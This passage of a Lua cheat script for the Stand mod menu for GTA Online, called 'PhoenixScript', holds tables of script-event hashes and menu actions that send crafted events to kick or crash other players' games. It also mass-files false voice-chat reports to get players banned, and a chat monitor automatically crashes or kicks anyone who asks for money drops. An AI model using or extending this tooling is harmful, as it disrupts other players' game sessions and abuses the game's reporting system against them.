    1307476082,
    -345908092,
    1365604007,
    1280085963,
    -612371672,
    -1488631377,
    -1720012585,
    -2042475657,
    -240257097,
    1240585650,
    1192658057,
    243540311,
    1191422458,
    -627821011,
    1129105265,
    1767220965,
    1664114676,
    -1032273438,
    1665678974,
    -1544167759,
    -87967637,
    -891346918,
    -1729804184,
    -1882923979,
    793694002,
    -158787995,
    1620254541,
    1428412924,
    -1713165973,
    -1212832151,
    87315576,
    635120817,
    275957394,
    -707133706,
    1623717033,
    420011712,
    -738295409,
    1665839162,
    -131274930,
    150294028,
    992970225,
    -551637263,
    603010792,
    -813003734,
    584503478,
    -355297939,
    -1789621123,
    -338399516,
    1317868303,
    1119498954,
    -1162153263,
    1974064500,
    1699621593,
    -1479371259,
    1410801811,
    -647202696,
    -966559987,
    1509139352,
    1437305856,
    -1564435822,
    765000166,
    2099816323,
    1310197925,
    -542139175,
    511933636,
    127054992,
    741525574,
    473998728,
    1642731136,
    2026253606,
    -1245024507,
    1394622857,
    814210644,
    356369059,
    -1185075112,
    1996378932,
    -743046526,
    -1014199946,
    474621183,
    1901047756,
    1644907640,
    -1840682990,
    1843603007,
    483883516,
    -1191687050,
    733106126,
    417206566,
    -962439346,
    -1147284669,
    53977718,
    830707189,
    1198154717,
    -1890951223,
    -1252906024,
    -1559754940,
    665709549,
    1922258436,
    -435067392,
    324865135,
    331283186,
    -363435150,
    1325156823,
    1483710319,
    -496432604,
    -727492889,
    194342417,
    -1406618481,
    -1879618040,
    -1080429176,
    -416183945,
    -1455659794,
    -1212832151,
      1317868303,
      -1252906024,
      -1890951223,
      1428412924,
      699592812,
      1922258436,
      1101235920,
      121406262,
      -1256990787,
      2965958374,
      -1054826273,
      1620254541,
      1401831542,
      2099816323,
      -1491386500,
      -977515445,
      -435067392,
      1347850743,
      -1729804184,
      1881968783,
      -1559754940,
      767605081,
      -442306200,
      733106126,
      -966559987,
      1841943281,
      -2033338628,
      -1243454584,
      1352706024,
      -1990292823,
      -1246838892,
      830707189,
      1119498954,
      -891346918,
      -920663435,
      -1924332863,
      -1549630786,
      1998625272,
      1977655521,
      620255745,
      2017765964,
      1974064500,
      1070934291,
      -345371965,
      -2042143896,
      495824472,
      1159655011,
      -2017629233,
      -1648921703,
      -1333236192,
      -1949011582,
      -720040631,
      -2147483647
}

local freemode_se = { 
    -1949011582,
    1244135940,
    931185764,
    880269514,
    -184087091,
    1120313136,
    -438498801,
    -2135614041,
    -2042143896,
    2017765964,
    1881968783,
    620255745,
    -1054826273,
    -190197401,
    37950012,
    1949047749,
    189426737,
    440451836,
    -1551731308,
    1027640676,
    -1858793976,
    1466961423,
    1919572202,
    1401831542,
    -1999145131,
    402719724,
    1525180252,
    -1756175141,
    1715510245,
    -801305185,
    1097312011,
    1717331426,
    1073357477,
    468940571,
    495824472,
    -2033338628,
    -962064463,
    931219308,
    -1730227041,
    501406112,
    -1042174840,
    314706334,
    1977655521,
    -2122716210,
    -1333236192,
    -620075057,
    -1542610935,
    1967155575,
    74423716,
    -961190199,
    -505351260,
    1217352219,
    877700249,
    639032041,
    -1243454584,
    -116602735,
    2058632186,
    891272013,
    393068387,
    1140870402,
    1101235920,
    -442306200,
    -345371965,
    -1379398115,
    575518757,
    889825697,
    764638896,
    1260307946,
    1430093873,
    550741583,
    858406863,
    1870047677,
    -1249091994,
    -49604647,
    -338445752,
    1302185744,
    -1975590661,
    1066968010,
    735307666,
    -763931968,
    1998625272,
    1723477505,
    206176460,
    -72590627,
    1045342179,
    -374910571,
    1000351374,
    2055893718,
    -599891884,
    -591321928,
    -720040631,
    1115000764,
    543040796,
    -1561698044,
    -1203311834,
    -1662268941,
    475909762,
    193916381,
    1983321563,
    1503747188,
    356132005,
    -1676842684,
    -529143813,
    1176365945,
    -10574121,
    306215142,
    -1740278601,
    -1676913872,
    -982430780,
    -660394610,
    1511186999,
    571133028,
    -1864549087,
    -922075519,
    -1437574346,
    -228458318,
    2131576964,
    177832320,
    1400694109,
    1166120552,
    145559396,
    -2080461139,
    1070934291,
    -1491386500,
    489321898,
    -1633299070,
    -638863591,
    405611573,
    -547753294,
    40168385,
    -1678014630,
    416104391,
    710791216,
    -253630609,
    -730739328,
    -1657159979,
    1570956502,
    -1705723814,
    -1595515659,
    261991583,
    -775470665,
    -1698341613,
    714506292,
    1376408207,
    2142017165,
    -1336925360,
    126014646,
    -1290202385,
    -402069102,
    2053227459,
    -1372360252,
    1006436615,
    547957431,
    809657238,
    -415666077,
    1188873208,
    -1549630786,
    1060402116,
    -504482199,
    89278042,
    1118933262,
    -1990292823,
    1352706024,
    348119077,
    1240791382,
    -948169674,
    2133081418,
    -262341369,
    1000457834,
    -375398087,
    -1329008922,
    1841943281,
    -852503405,
    925173178,
    -1989372325,
    1303708261,
    -1911813629,
    2098987581,
    -865197423,
    -1825953974,
    -921073084,
    156856405,
    -2060629306,
    262768112,
    421494533,
    1755988437,
    -1493184845,
    -1657017550,
    -577286683,
    465570678,
    -1632172694,
    1972484238,
    14345383,
    743968101,
    599029146,
    962465625,
    960916034,
    -1459006650,
    778805747,
    -1580390976,
    823645419,
    -2065346036,
    1213808185,
    67004146,
    582648726,
    -1031098030,
    -1295633605,
    614999494,
    -791577348,
    1294893057,
    -171207973,
    -568266702,
    1212829040,
    1345577858,
    767605081,
    -977515445,
    -365271546,
    -455354067,
    -1174459121,
    1096684293,
    -1497250740,
    -911939009,
    1347850743,
    -920663435,
    -1057419833,
    -1596113101,
    -1759105725,
    -1336932351,
    -1648921703,
    -1437387234,
    2062282408,
    1692477431,
    1553508941,
    699592812,
    1417613287,
    -2029779863,
    1596100569,
    392501634,
    -909357184,
    -1442614028,
    171064260,
    -152440739,
    -1353116588,
    835608275,
    1307476082,
    -345908092,
    1365604007,
    1280085963,
    -612371672,
    -1488631377,
    -1720012585,
    -2042475657,
    -240257097,
    1240585650,
    1192658057,
    243540311,
    1191422458,
    -627821011,
    1129105265,
    1767220965,
    1664114676,
    -1032273438,
    1665678974,
    -1544167759,
    -87967637,
    -891346918,
    -1729804184,
    -1882923979,
    793694002,
    -158787995,
    1620254541,
    1428412924,
    -1713165973,
    -1212832151,
    87315576,
    635120817,
    275957394,
    -707133706,
    1623717033,
    420011712,
    -738295409,
    1665839162,
    -131274930,
    150294028,
    992970225,
    -551637263,
    603010792,
    -813003734,
    584503478,
    -355297939,
    -1789621123,
    -338399516,
    1317868303,
    1119498954,
    -1162153263,
    1974064500,
    1699621593,
    -1479371259,
    1410801811,
    -647202696,
    -966559987,
    1509139352,
    1437305856,
    -1564435822,
    765000166,
    2099816323,
    1310197925,
    -542139175,
    511933636,
    127054992,
    741525574,
    473998728,
    1642731136,
    2026253606,
    -1245024507,
    1394622857,
    814210644,
    356369059,
    -1185075112,
    1996378932,
    -743046526,
    -1014199946,
    474621183,
    1901047756,
    1644907640,
    -1840682990,
    1843603007,
    483883516,
    -1191687050,
    733106126,
    417206566,
    -962439346,
    -1147284669,
    53977718,
    830707189,
    1198154717,
    -1890951223,
    -1252906024,
    -1559754940,
    665709549,
    1922258436,
    -435067392,
    324865135,
    331283186,
    -363435150,
    1325156823,
    1483710319,
    -496432604,
    -727492889,
    194342417,
    -1406618481,
    -1879618040,
    -1080429176,
    -416183945,
    -1455659794
}

local kick_blackscreen = {
	495824472,
	-1949011582,
	-1730227041,
	-1882923979,
	-1252906024,
	-1559754940,
	-1054826273,
	-435067392,
	-442306200,
	1352706024,
	-1890951223,
	-966559987,
	-1990292823,
	1428412924,
	-1212832151,
	-2033338628,
	-1243454584,
	-1729804184,
	-920663435,
	-1549630786,
	1998625272,
	1977655521,
	2017765964,
	1070934291,
	-345371965,
	-2042143896,
	1347850743,
	-1580390976,
	-1491386500,
	823645419,
	1317868303,
	1620254541,
	1401831542,
	1881968783
}


























function VehKickSpam(pid)
	for i = 1, #data4 do
		--local ped = PLAYER.GET_PLAYER_PED(pid)
		--ped.CLEAR_PED_TASKS_IMMEDIATELY(pid)
		send_script_event(0xB0886E20, pid, {0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
		util.yield()
	end
end

selectedplayer = {}
for b = 0, 32 do
    selectedplayer[b] = false
end
excludeselected = false

function list_players(list_id)
	for pid = 0, 32 do
		if players.exists(pids) then
			menu.toggle(list_id, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "", function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end
end

function notification(notif, log, map)
	if log then
		util.toast("[PhoenixScript] " .. tostring(notif), TOAST_LOGGER)
	end
	if map then
		util.toast("[PhoenixScript] " .. tostring(notif), TOAST_ABOVE_MAP)
	end
end

cmd_id = {}
for a = 0, 32 do
	cmd_id[a] = 0
end

local chatdata = {}
chatloaddata = (scriptdir .. "\\data\\ChatJudge\\ChatJudge.data")
function chatload()
    if not filesystem.exists(chatloaddata) then return end
    for line in io.lines(chatloaddata) do chatdata[#chatdata + 1] = line end
end
chatload()

local chatdata2 = {}
chatloaddata2 = (scriptdir .. "\\data\\ChatJudge\\ChatJudge2.data")
function chatload2()
    if not filesystem.exists(chatloaddata2) then return end
    for line in io.lines(chatloaddata2) do chatdata2[#chatdata2 + 1] = line end
end
chatload2()

local chatdata3 = {}
chatloaddata3 = (scriptdir .. "\\data\\ChatJudge\\ChatJudge3.data")
function chatload3()
    if not filesystem.exists(chatloaddata3) then return end
    for line in io.lines(chatloaddata3) do chatdata3[#chatdata3 + 1] = line end
end
chatload3()

chatdata_id = {}
for a = 1, #chatdata do
	chatdata_id[a] = 0
end

chatdata_id2 = {}
for a = 1, #chatdata2 do
	chatdata_id2[a] = 0
end

chatdata_id3 = {}
for a = 1, #chatdata3 do
	chatdata_id3[a] = 0
end

attachspam = {}
for a = 0, 32 do
	attachspam[a] = 0
end

local enablechatjudge = true
local crashdtc, kickdtc, crashdtc2, kickdtc2, crashdtc3, kickdtc4
local crashdtcbeg, kickdtcbeg = true, false


local success, success_id = true, 4


if success == false then
	notification("...\\AppData\\Roaming\\Stand\\Lua Scripts\\" .. SCRIPT_NAME .. ".lua:1488: Invalid command id " .. math.random(38,41), true, true)
end

local moneydropbeg = {
	"money drop",
	"MONEY DROP",
	"Money Drop",
	"Money drop",
	"CAN I HAVE A MONEY DROP",
	"drop money",
	"pls money",
	"money pls",
	"pls drop",
	"drop pls",
	"money modder",
	"modder money",
	"please money",
	"money please",
	"drop please",
	"please drop",
	"can i have some money",
	"can i get some money",
	"modder pls",
	"pls modder",
	"drop now",
	"can i have a money drop",
	"can i pls have a money drop",
	"can i please have a money drop",
	"Plz money",
	"Drop me plz",
	"Give money please",
	"Drop rp",
	"Can you please drop me",
	"Money please",
	"Please give me money",
	"Cmon give money",
	"Money yes plz",
	"mony plz",
	"mony pls",
	"Can you give money please",
	"drop rp",
	"Ples drop me some money",
	"Please drop some money",
	"I need money",
	"I need mony",
	"Can you give mony",
	"Can you give money",
	"/money",
	"plz money drop",
	"please money drop",
	"money drop",
	"/money dorp",
	"/money drop",
	"!money",
	"!money dorp",
	"!money drop",
	"!spawn money",
	"any money drop",
	"any money dropper here?",
	"money please?",
	"money please",
	"action figures please",
	"action figure drop please",
	"can you drop action figures?",
	"please drop action figures",
	"please level me upo",
	"please level me up",
	"please drop rp",
	"drop rp on me please",
	"help me get money",
	"help me money",
	"give money",
	"give me money",
	"pls give the money",
	"pls give the money!",
	"pls spawn some money",
	"please spawn me money",
	"please bro give money",
	"I need money!",
	"i need money",
	"cmon give money",
	"is there a money command",
	"is there a money drop",
	"please spawn some money on me",
	"i need the money please",
	"yes bro drop me money",
	"moeny please",
	"please moeny drop",
	"moeny drop",
	"i need moeny drop",
	"please mony",
	"please moni",
	"plz mony",
	"plz moeny",
	"plz money",
	"pls money",
	"plz drop money",
	"pls dorp money",
	"pls drop money",
	"pls drop moeny",
	"plz drop moeny",
	"money drop?",
	"rp drop",
	"%s+moeny%s+",
	"%s+mony%s+",
	"%s+cash%s+",
	"%s+pls%s+",
	"%s+plz%s+",
	"%s+please%s+",
	"www.gta5dh.com",
	"i am poor pls drom money",
	"WWW.GTAKJ.CN",
	"www.gtavxj.com",
	"GTA5UJ",
	"GTA5662",
	"GTA0066",
	"WWW.GTA5EV.COM",
	"GTA5KF",
	"GTA5662",
	"%s+www.%s+",
	"%s+.CN%s+",
	"GTA5YX",
	"WWW.GTAKJ.CN",
	"www.gta5ybb.com",
	"%s+shuagta%s+",
	"GTA5WR",
	"gta51P",
	"GTA2234",
	"%s+wx%s+",
	"%s+gta9228%s+",
	"%s+.com%s+",
	"%$",
	"%qq",
	"%QQ",
	"%s+www.gtavxj.com%s+",
	"%s+GTAVXJ%s+",
	"gta2224",
	"%s+/qq%s+",
	"%s+gta%s+",
	"%s+GTA%s+",
	"%s+qq%s+",
	"%s+QQ%s+",
}

local attachvehstest = {
	"adder",
	"zentorno"
}

local attachvehs = {
	"adder",
	"zentorno",
	"buzzard",
	"bullet",
	"frogger",
	"blista",
	"cargobob",
	"dinghy",
	"dilettante",
	"asterope",
	"banshee",
	"krieger",
	"insurgent2",
	"patriot2",
	"starling",
	"nimbus",
	"bus",
	"titan",
	"shamal",
	"luxor",
	"duster",
	"molotok",
	"bombushka",
	"xls2",
	"zorusso",
	"jetmax",
	"dump",
	"kosatka",
	"cargoplane",
	"stockade",
	"rhino"
}

local bigvehs = {
	"volatol",
	"bombushka",
	"kosatka",
	"cargoplane",
	"alkonost",
	"rhino",
	"blimp",
	"blimp2",
	"bus",
	"jet",
	"luxor2"
}

local volatols = {
	"volatol"
}

local bombushkas = {
	"bombushka"
}

local kosatkas = {
	"kosatka"
}

local cargoplanes = {
	"cargoplane"
}

local alkonosts = {
	"alkonost"
}

local planes = {
	"luxor",
	"alphaz1",
	"avenger",
	"besra",
	"blimp",
	"blimp2",
	"cuban800",
	"dodo",
	"duster",
	"howard",
	"hydra",
	"jet",
	"lazer",
	"luxor2",
	"mammatus",
	"mijet",
	"molotok",
	"nokota",
	"pyro",
	"shamal"
}

local exists1, exists2, exists3 = false, false, false

local chaos, gravity, speed = false, true, 100

function checkexists()
	if filesystem.exists(chatloaddata) then
		exists1 = true
	end
	if filesystem.exists(chatloaddata2) then
		exists2 = true
	end
	if filesystem.exists(chatloaddata3) then
		exists3 = true
	end
end
checkexists()

if success then
	custselc = menu.list(menu.my_root(), "Custom Selection", {}, "", function(); end)

	menu.toggle(custselc, "Exclude Selected", {}, "", function(on_toggle)
		if on_toggle then
			excludeselected = true
		else
			excludeselected = false
		end
	end)

	menu.divider(custselc, "Actions")

	menu.action(custselc, "Kick (fixed)", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					if players.user() == players.get_host() then
						notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
						menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
					else
						KickV1(pids, 2)
						notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
					end
					util.yield()
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					if players.user() == players.get_host() then
						notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
						menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
					else
						KickV1(pids, 2)
						notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
					end
					util.yield()
				end
			end
		end
	end)

	--[[menu.action(custselc, "Orbliterate", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					do_fade_in(pid)
					util.yield(5000)
					orbital(pids)
					util.yield(1000)
					do_fade_out(pid)

				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					orbital(pids)
					util.yield()
				end
			end
		end
	end)]]



	menu.action(custselc, "Ban Voice Chat", {}, "May lag your game when in progress", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					for i = 1, 30 do
						menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pids))
						menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pids))
						util.yield()
					end
					notification("Ban Voice Chat has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			end
		end
	end)


	menu.action(custselc, "Block Passive (broken)", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					send_script_event(-909357184, pids, {pids, 1})
					send_script_event(-909357184, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					send_script_event(-909357184, pids, {pids, 1})
					send_script_event(-909357184, pids, {pids, 1})
					util.yield()
					notification("Block Passive has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			end
		end
	end)


	menu.action(custselc, "Vehicle Kick (broken)", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED(pids)
					TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
					util.trigger_script_event(1 << pids, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					local ped = PLAYER.GET_PLAYER_PED(pids)
					TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
					util.trigger_script_event(1 << pids, {0xB0886E20, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
					notification("Vehicle Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			end
		end
	end)


	menu.action(custselc, "CEO Ban (Fixed)", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					util.trigger_script_event(1 << pid, {1355230914, 0, 1, 5, 0})
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					util.trigger_script_event(1 << pid, {1355230914, 0, 1, 5, 0})
					notification("CEO Ban has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			end
		end
	end)


	menu.action(custselc, "Crash (Fixed but kinda kicks them too)", {}, "", function()
		for pids = 0, 32 do
			if excludeselected then
				if pids ~= players.user() and not selectedplayer[pids] and players.exists(pids) then
					Crash(pids)
					notification("SE Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			else
				if pids ~= players.user() and selectedplayer[pids] and players.exists(pids) then
					Crash(pids)
					notification("SE Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
			end
		end
	end)

	menu.divider(custselc, "Players")

	for pids = 0, 32 do
		if players.exists(pids) then
			cmd_id[pids] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pids)), {}, "PID - ".. pids, function(on_toggle)
				if on_toggle then
					selectedplayer[pids] = true
				else
					selectedplayer[pids] = false
				end
			end)
		end
	end

	protex = menu.list(menu.my_root(), "Protections", {}, "", function(); end)
	
	menu.action(protex, "Remove Attachments", {"remove attachments"}, "Put this here for redundancy", function()
		notification("Removing Attachments", true, true)
		menu.trigger_commands("removeattachments")
	
	end)

	menu.action(protex,"Clear all Entities", {"clear area"}, "Useful for un-lagging areas",function()
		for_table_do(util.get_all_vehicles(),false,function(ent) 
			util.delete_entity(ent)
		end)
		util.yield(30)
		for_table_do(util.get_all_peds(),false,function(ent) 
			util.delete_entity(ent)
		end)
		util.yield(30)
		for_table_do(util.get_all_objects(),false,function(ent) 
			util.delete_entity(ent)
		end)
	end)
	
	menu.divider(protex, "Crash Protections")
	
	
	menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("toggling block all incoming syncs on... stay safe homie", true, true)
			menu.trigger_commands("blocksyncall on")
		else
			notification("toggling block all incoming syncs off...", true, true)
			menu.trigger_commands("blocksyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("toggling block all outgoing syncs on", true, true)
			menu.trigger_commands("desyncall on")
		else
			notification("toggling block all outgoing syncs off", true, true)
			menu.trigger_commands("desyncall off")
		end
	end)

	menu.toggle(protex, "Toggle Anticrashcam", {}, "Put this here for redundancy", function(on_toggle)
		if on_toggle then
			notification("toggling anticrashcam... stay safe homie", true, true)
			menu.trigger_commands("anticrashcam on")
		else
			notification("toggling anticrashcam off...", true, true)
			menu.trigger_commands("anticrashcam off")
		end
	end)

	menu.toggle(protex, "Toggle Panic Mode", {"panic"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		if on_toggle then
			notification("toggling panic mode on... stay safe homie", true, true)
			menu.trigger_commands("desyncall on")
			menu.trigger_commands("blocksyncall on")
			menu.trigger_commands("ignoreall on")
			menu.trigger_commands("anticrashcamera on")
		else
			notification("toggling panic mode off...", true, true)
			menu.trigger_commands("desyncall off")
			menu.trigger_commands("blocksyncall off")
			menu.trigger_commands("ignoreall off")
			menu.trigger_commands("anticrashcamera off")
		end
	end)




	chatjudge = menu.list(menu.my_root(), "Chat Judge", {}, "", function(); end)

	menu.toggle(chatjudge, "Enable", {}, "Enables Chat Judge feature (master switch)", function(on_toggle)
		if on_toggle then
			enablechatjudge = true
		else
			enablechatjudge = false
		end
	end, true)

	menu.divider(chatjudge, "Potentially unwanted chatters")

	menu.toggle(chatjudge, "Kick", {}, "", function(on_toggle)
		if on_toggle then
			kickdtcbeg = true
		else
			kickdtcbeg = false
		end
	end, false)
	
	menu.toggle(chatjudge, "Crash", {}, "", function(on_toggle)
		if on_toggle then
			crashdtcbeg = true
		else
			crashdtcbeg = false
		end
	end, true)

	menu.divider(chatjudge, "Custom")

	chatlist1 = menu.list(chatjudge, "List 1", {}, "", function(); end)
	chatlist2 = menu.list(chatjudge, "List 2", {}, "", function(); end)
	chatlist3 = menu.list(chatjudge, "List 3", {}, "", function(); end)

	if exists1 then
		menu.toggle(chatlist1, "Kick", {}, "", function(on_toggle)
			if on_toggle then
				kickdtc = true
			else
				kickdtc = false
			end
		end)
		
		menu.toggle(chatlist1, "Crash", {}, "", function(on_toggle)
			if on_toggle then
				crashdtc = true
			else
				crashdtc = false
			end
		end, true)

		menu.action(chatlist1, "Update List", {}, "Reload the script to update the list", function()
			--[[for i = 1, #chatdata do
				menu.delete(chatdata_id[i])
			end
			chatload()
			for i = 1, #chatdata do
				chatdata_id[i] = menu.action(chatlist1, tostring(chatdata[i]), {}, "ID - " .. tostring(i),function()end)
			end]]
			notification("Reload the script to update Chat Judge list", true, true)
		end)


		menu.divider(chatlist1, "Banned Words")

		for i = 1, #chatdata do
			chatdata_id[i] = menu.action(chatlist1, tostring(chatdata[i]), {}, "ID - " .. tostring(i),function()end)
		end
	else
		menu.action(chatlist1, "Failed to find ChatJudge.data", {}, "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge.data", function()
			notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge.data", true, true)
		end)
	end

	if exists2 then
		menu.toggle(chatlist2, "Kick", {}, "", function(on_toggle)
			if on_toggle then
				kickdtc2 = true
			else
				kickdtc2 = false
			end
		end)
		
		menu.toggle(chatlist2, "Crash", {}, "", function(on_toggle)
			if on_toggle then
				crashdtc2 = true
			else
				crashdtc2 = false
			end
		end)

		menu.action(chatlist2, "Update List", {}, "Reload the script to update the list", function()
			notification("Reload the script to update Chat Judge list", true, true)
		end)


		menu.divider(chatlist2, "Banned Words")

		for i = 1, #chatdata2 do
			chatdata_id2[i] = menu.action(chatlist2, tostring(chatdata2[i]), {}, "ID - " .. tostring(i),function()end)
		end
	else
		menu.action(chatlist2, "Failed to find ChatJudge2.data", {}, "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge2.data", function()
			notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge2.data", true, true)
		end)
	end

	if exists3 then
		menu.toggle(chatlist3, "Kick", {}, "", function(on_toggle)
			if on_toggle then
				kickdtc3 = true
			else
				kickdtc3 = false
			end
		end)
		
		menu.toggle(chatlist3, "Crash", {}, "", function(on_toggle)
			if on_toggle then
				crashdtc3 = true
			else
				crashdtc3 = false
			end
		end)

		menu.action(chatlist3, "Update List", {}, "Reload the script to update the list", function()
			notification("Reload the script to update Chat Judge list", true, true)
		end)


		menu.divider(chatlist3, "Banned Words")

		for i = 1, #chatdata3 do
			chatdata_id3[i] = menu.action(chatlist3, tostring(chatdata3[i]), {}, "ID - " .. tostring(i),function()end)
		end
	else
		menu.action(chatlist3, "Failed to find ChatJudge3.data", {}, "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge3.data", function()
			notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge3.data", true, true)
		end)
	end

	chat.on_message(function(sender_player_id, sender_player_name, message, is_team_chat)
		if enablechatjudge then
			pid = sender_player_id
			for i = 1, #moneydropbeg do -- money beggars
				if string.find(message, moneydropbeg[i], 1) then
					if (kickdtcbeg and sender_player_id ~= players.user()) then
						if players.user() == players.get_host() then
							notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(moneydropbeg[i]) .. "] in chat! Sending Host Kick", true, true)
							menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(sender_player_id))
						else
							notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(moneydropbeg[i]) .. "] in chat! Sending Kick", true, true)
							KickV1(sender_player_id, 2)
						end
					end
					if (crashdtcbeg and sender_player_id ~= players.user()) then
						notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(moneydropbeg[i]) .. "] in chat! Sending SE Crash", true, true)
						Crash(sender_player_id)
					end
				end
			end
			if exists1 then
				for i = 1, #chatdata do -- custom list
					if string.find(message, chatdata[i], 1) then
						if (kickdtc and sender_player_id ~= players.user()) then
							if players.user() == players.get_host() then
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata[i]) .. "] in chat! Sending Host Kick", true, true)
								menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(sender_player_id))
							else
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata[i]) .. "] in chat! Sending Kick", true, true)
								KickV1(sender_player_id, 2)
								KickV1(sender_player_id, 2)
							end
						end
						if (crashdtc and sender_player_id ~= players.user()) then
							notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata[i]) .. "] in chat! Sending SE Crash", true, true)
							EventArray(sender_player_id, 120, -1949011582)
							Crash(sender_player_id)
						end
					end
				end
			end
			if exists2 then
				for i = 1, #chatdata2 do -- custom list 2
					if string.find(message, chatdata2[i], 1) then
						if (kickdtc2 and sender_player_id ~= players.user()) then
							if players.user() == players.get_host() then
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata2[i]) .. "] in chat! Sending Host Kick", true, true)
								menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(sender_player_id))
							else
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata2[i]) .. "] in chat! Sending Kick", true, true)
								KickV1(sender_player_id, 2)
								KickV1(sender_player_id, 2)
							end
						end
						if (crashdtc2 and sender_player_id ~= players.user()) then
							notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata2[i]) .. "] in chat! Sending SE Crash", true, true)
							EventArray(sender_player_id, 120, -1949011582)
							Crash(sender_player_id)
						end
					end
				end
			end
			if exists3 then
				for i = 1, #chatdata3 do -- custom list 3
					if string.find(message, chatdata3[i], 1) then
						if (kickdtc3 and sender_player_id ~= players.user()) then
							if players.user() == players.get_host() then
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata3[i]) .. "] in chat! Sending Host Kick", true, true)
								menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(sender_player_id))
							else
								notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata3[i]) .. "] in chat! Sending Kick", true, true)
								KickV1(sender_player_id, 2)
							end
						end
						if (crashdtc3 and sender_player_id ~= players.user()) then
							notification("Detected " .. sender_player_name .. " [PID " .. sender_player_id .."] said [" .. tostring(chatdata3[i]) .. "] in chat! Sending SE Crash", true, true)
							EventArray(sender_player_id, 120, -1949011582)
							Crash(sender_player_id)
						end
					end
				end
			end
		end
	end)

	

	spoofpresets = menu.list(menu.my_root(), "IP Spoofer Presets", {}, "Stand's default GeoIP may show wrong location on some presets", function(); end)

